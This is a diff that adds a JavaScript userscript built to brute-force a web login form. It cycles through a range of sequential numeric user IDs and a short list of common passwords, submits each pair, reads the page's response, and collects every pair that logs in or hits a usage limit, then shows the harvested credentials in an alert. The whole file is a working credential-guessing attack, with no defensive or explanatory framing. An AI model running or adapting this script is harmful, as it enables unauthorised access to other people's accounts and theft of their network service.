@@ -1,0 +1,64 @@
+(function() {
+    'use strict';
+    
+    var passes = ["hello123","zxcvbnm","asdfghjkl","123","xyz","/","123456789","password","123456"];      //<-----Passwords Here.
+    var startId = 131001;                                                 //<-----Starting ID Here.
+    var endId = 131890;                                                   //<-----Ending ID Here.
+    
+    
+    //Do Not Change Below.
+    
+    var ids = "";
+    var passCount = passes.length;
+    var loc = -1;
+    var usernameInput = $('input[name=username]');
+    var passwordInput = $('input[name=password]');
+    var loginButton = $('input[name=btnSubmit]');
+    
+    function doWork(uname,upass){
+        usernameInput.val(uname);
+        passwordInput.val(upass);
+        loginButton.click();
+
+        var txt = "";
+        window.setTimeout(function(){
+            txt = $("#msgDiv").find("xmp").text();
+            if(txt == "You have successfully logged in" || txt == "You have reached Maximum Login Limit." || txt == "Your data transfer has been exceeded, Please contact the administrator"){    //Add other conditions
+                ids += upass + " : " + uname + "\n";
+                if(txt == "You have successfully logged in")
+                    $('input[name=btnSubmit]').click();
+            }
+        },400);
+    }
+    
+    function getWorkDone(callback) {
+        var u = startId;
+        var interval = setInterval(function(){
+              doWork(u,passes[loc]);
+              if(u==endId+1){
+                  clearInterval(interval);
+                  callback();
+              }
+              $('body').keypress(function(e){    //Stops function when you press space.
+                 if(e.keyCode == 32){
+                      clearInterval(interval);
+                     alert(ids);
+                 }
+              });
+              u++;
+          },600);
+    }
+    
+    function main(){
+        if(loc==passCount-1)
+            alert(ids);
+        else{
+            ++loc;
+            getWorkDone(function(){main();});
+        }
+    }
+    ++loc;
+    getWorkDone(function(){main();});
+
+    
+})();
